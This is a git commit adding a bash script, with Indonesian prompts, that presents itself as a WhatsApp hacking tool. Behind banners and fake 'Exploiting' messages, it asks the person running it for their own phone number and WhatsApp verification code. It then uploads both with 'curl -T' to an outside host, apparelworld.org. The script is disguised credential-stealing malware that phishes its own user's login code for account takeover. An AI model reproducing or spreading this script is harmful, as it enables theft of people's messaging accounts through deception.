ca151801d77f6202a36e6a09d7e7616f25674076
arjunnoobz <50669518+arjunnoobz@users.noreply.github.com>
2019-05-21 20:37:02 +0700

    Add files via upload

---
+++ hackwa.sh
@@ -0,0 +1,116 @@
+#!/bin/bash
+clear
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+
+
+sleep 0.90
+echo $green"================================================================"
+
+
+echo $blue"........   ........ ::::::::::::::: ::::::::::::  ::::"
+echo $blue"........   ...  ... :::         ::: :::           :: :    ,,,,"
+echo $blue"...  ...   ...  ... :::         ::: :::           :: :   ,  '"
+echo $blue"...  ...   ...  ... :::         ::: :::           :: :  ,  '"
+echo $blue"...  ...   ...  ... :::         ::: :::           :: : ' '"
+echo $blue"...  .........  ... :::         ::: :::           :: :' ,"
+echo $blue"...             ... :::         ::: :::           :: ' ,'"
+sleep 0.90
+sleep 0.90
+echo $blue"...  .........  ... ::::::::::::::: :::           :: ,,  ,"
+echo $blue"...  .........  ... :::         ::: :::           :: : '  ,"
+echo $blue"...  ..     ..  ... :::         ::: :::           :: :  '  '"
+echo $blue"...  ..     ..  ... :::         ::: :::           :: :    '  '"
+echo $blue"...  ..     ..  ... :::         ::: ::::::::::::  ::::      , '"
+
+echo $green"=============================================================="
+sleep 0.90
+echo $green":::   :::   :::    :::::::::::::::"
+echo $green":::   :::   :::    :::         :::"
+echo $green":::   :::   :::    :::         :::"
+echo $green":::   :::   :::    :::::::::::::::"
+sleep 0.90
+sleep 0.90
+echo $green":::   :::   :::    :::         :::"
+echo $green":::   :::   :::    :::         :::"
+echo $green":::::::::::::::    :::         :::"
+echo $green"==============================================================="
+sleep 0.90
+sleep 0.90
+sleep 0.90
+sleep 0.90
+clear
+sleep 0.90
+sleep 0.90
+sleep 0.90
+sleep 0.90
+
+
+echo $blue"::::::::$green::::::::::::$purple::::::::::::::$cyan:::::::::::"
+
+figlet           ARJUN_24
+
+echo $blue"::::::::$green::::::::::::$purple::::::::::::::$cyan:::::::::::"
+
+
+echo $green"------------------------------------"
+sleep 0.90
+echo $blue" -         By :$green ARJUN_Noobz   "
+sleep 0.90
+echo $blue" -                                  "
+sleep 0.90
+echo $blue" -       Team:$green Cyber Team     "
+sleep 0.90
+echo $blue" -                                  "
+sleep 0.90
+echo $blue" -    Contact:$green 0838697****    "
+sleep 0.90
+echo $blue" -                                  "
+sleep 0.90
+echo $green"------------------------------------"
+sleep 0.90
+echo $blue"-------------------------------------"
+sleep 0.90
+echo $blue"-  BERDOA DULU SEBELUM MEMAKAI      -"
+sleep 0.90
+echo $blue"-------------------------------------"
+sleep 0.90
+echo $blue"- SEMOGA BERHASIL HACK WA NYA.....  -"
+sleep 0.90
+echo $blue"-------------------------------------"
+
+
+read -p "Masukan Nomer Kamu (+62xxxx)=> " nomer;
+read -p "Masukan Nomer Target (+62xxxx) => " target;
+sleep 2
+echo "[+] Syncing Target...";
+sleep 1
+echo "Login  => $nomer";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Exploiting...";
+echo "Nomer => $nomer" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5;
+echo "[+] Done.";
+echo "Tunggu 5-10 Menit Untuk Mendapatkan Code.";
+read -p "Verify Code => " code;
+sleep 2
+echo "[+] Connecting to whatsapp.com...";
+echo "Login => $nomer";
+sleep 0.5
+echo "Code => $code";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Sending Exploit...";
+echo "Code => $code" >> kontol.html;
+curl -T kontol.html http://apparelworld.org/
+sleep 5
+echo "[+] Success Exploited!";
+exit;
